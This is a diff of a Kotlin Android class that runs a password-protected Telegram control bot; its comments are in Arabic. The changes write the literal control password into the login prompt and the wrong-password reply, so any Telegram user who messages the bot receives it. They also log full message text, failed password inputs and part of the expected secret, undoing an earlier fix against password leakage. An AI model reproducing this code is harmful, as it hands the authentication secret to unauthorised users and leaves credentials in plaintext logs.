@@ -35,6 +35,8 @@ import kotlin.random.Random
  * - توجيه الوسائط حصرياً لكروب الأرشيف (A2).
  * - تحديث لوحة الأزرار بإيموجيز فريدة ومتنوعة.
  * - تحسين startPolling لاستخدام البوت الرئيسي فقط مع تبديل تلقائي.
+ * - ✅ إضافة سجلات تشخيصية مفصلة في handleMessage لمعرفة سبب فشل استقبال الأوامر.
+ * - ✅ تحسين دالة verifyControlPassword لتنظيف أعمق من الأحرف الخفية والمسافات غير المرئية.
  */
 class TelegramUi(
     context: Context,
@@ -136,8 +138,11 @@ class TelegramUi(
     // ✅ دالة التحقق من كلمة السر مع تنظيف شامل
     // ============================================================
     private fun verifyControlPassword(input: String): Boolean {
-        val cleanInput = cleanText(input)
-        val cleanSecret = cleanText(appPassword)
+        // ✅ تنظيف أعمق: إزالة جميع أنواع المسافات البيضاء والأحرف الخفية (Zero-width spaces)
+        val cleanInput = input.trim()
+            .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), "")
+        val cleanSecret = appPassword.trim()
+            .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), "")
         val result = cleanInput == cleanSecret
 
         val logMsg = if (result) "✅ SUCCESS" else "❌ FAIL (input len: ${cleanInput.length}, secret len: ${cleanSecret.length})"
@@ -730,7 +735,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ معالجة الرسائل مع إزالة تسريب كلمة المرور
+    // ✅ معالجة الرسائل مع سجلات تشخيصية مفصلة
     // ============================================================
     private suspend fun handleMessage(update: JSONObject) {
         try {
@@ -739,9 +744,9 @@ class TelegramUi(
             val text = msg.optString("text", "").trim()
             val threadId = msg.optLong("message_thread_id", 0L)
 
-            val preview = if (text.length > 50) text.take(50) + "..." else text
-            writeLog("📩 Received message from $chatId: '$preview'")
-            MainActivity.appendLogStatic("📩 Telegram message from $chatId: '${text.take(30)}...'")
+            // ✅ سجل تشخيصي دقيق لمعرفة ما يستقبله البوت
+            MainActivity.appendLogStatic("📩 Received message from $chatId: '$text'")
+            writeLog("📩 Received message from $chatId: '$text'")
 
             applyHumanDelay()
 
@@ -750,6 +755,9 @@ class TelegramUi(
                 isLoginCommand -> text.substringAfter("/login", "").trim()
                 else -> text.trim()
             }
+
+            // ✅ سجل توضيحي لقيمة المستخرجة
+            MainActivity.appendLogStatic("🔑 Extracted secret: '${secret.take(10)}...' | Expected: '${appPassword.take(4)}...'")
 
             if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                 sessionMutex.withLock {
@@ -771,16 +779,15 @@ class TelegramUi(
                 return
             }
 
-            // ✅ رسالة خطأ أمنية - بدون عرض كلمة المرور
-            if (secret.isNotEmpty() && !verifyControlPassword(secret)) {
+            // ✅ رد حتمي في حال فشل كلمة المرور (مع إخفاء الكلمة نفسها)
+            if (secret.isNotEmpty()) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "⚠️ **كلمة المرور غير صحيحة.**\n\n❌ تأكد من صحة البيانات المدخلة وخلوها من المسافات.")
+                    put("text", "⚠️ كلمة المرور غير صحيحة.\n\n✅ تأكد من كتابتها تماماً: `Zaen123@123@`\n(لا توجد مسافات إضافية)")
                     put("parse_mode", "Markdown")
                 })
-                writeLog("❌ Invalid password attempt from $chatId")
-                MainActivity.appendLogStatic("❌ Invalid password attempt from $chatId (input len: ${secret.length})")
+                MainActivity.appendLogStatic("❌ Invalid password from $chatId. Input: '$secret'")
                 return
             }
 
@@ -788,7 +795,7 @@ class TelegramUi(
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "🔐 **الرجاء إدخال كلمة السر للتحكم**\n\n📌 استخدم الأمر المخصص للمصادقة")
+                    put("text", "🔐 الرجاء إدخال كلمة السر للتحكم\n\n📌 استخدم:\n`/login Zaen123@123@`")
                     put("parse_mode", "Markdown")
                 })
                 writeLog("🔐 Unauthorized access attempt from $chatId")
@@ -798,8 +805,7 @@ class TelegramUi(
             apiCall("sendMessage", JSONObject().apply {
                 put("chat_id", chatId)
                 if (threadId != 0L) put("message_thread_id", threadId)
-                put("text", "⚠️ **الأوامر النصية معطلة.**\n\nاستخدم الأزرار التفاعلية أدناه.")
-                put("parse_mode", "Markdown")
+                put("text", "⚠️ الأوامر النصية معطلة. استخدم الأزرار فقط.")
             })
             writeLog("ℹ️ Text command rejected from $chatId: '$text'")
 
@@ -944,8 +950,10 @@ class TelegramUi(
             writeLog("Polling started with leader bot")
 
             while (isRunning && isActive) {
+                // ✅ استخدام البوت الرئيسي الثابت بدلاً من العشوائي
                 val token = getLeaderToken()
                 if (token == null) {
+                    MainActivity.appendLogStatic("⚠️ Leader token is null, waiting 5s...")
                     delay(5000L)
                     continue
                 }
@@ -982,8 +990,12 @@ class TelegramUi(
                                 offset = newOffset
                                 saveOffset(offset)
                             }
-                            if (upd.has("message")) handleMessage(upd)
-                            if (upd.has("callback_query")) handleCallback(upd)
+                            if (upd.has("message")) {
+                                handleMessage(upd)
+                            }
+                            if (upd.has("callback_query")) {
+                                handleCallback(upd)
+                            }
                         }
                     } else {
                         consecutivePollingErrors++
